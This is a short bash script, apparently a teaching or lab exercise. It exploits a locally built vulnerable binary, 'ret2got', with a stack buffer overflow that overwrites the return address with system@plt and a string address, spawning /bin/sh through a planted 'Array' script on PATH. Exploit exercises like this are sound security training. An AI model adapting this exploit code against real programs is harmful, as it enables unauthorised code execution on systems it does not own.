#!/bin/bash

# Address of the PLT entry of system and the "Array has..." string
system_plt_addr=0x080490a0
str_addr=0x0804a01c

# Make sure the executable is built
make ret2got

# Set up the shell script to call
echo /bin/sh > Array
chmod 777 Array
export PATH=.:$PATH

# Execute the actual exploit (overwrite return address with PLT address of system and provide "Array has..." string to system)
./ret2got "AAAAAAAA" "$(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 16 + pack('<L', $system_plt_addr) + b'A' * 4 + pack('<L', $str_addr))")"

# Clean up
rm Array
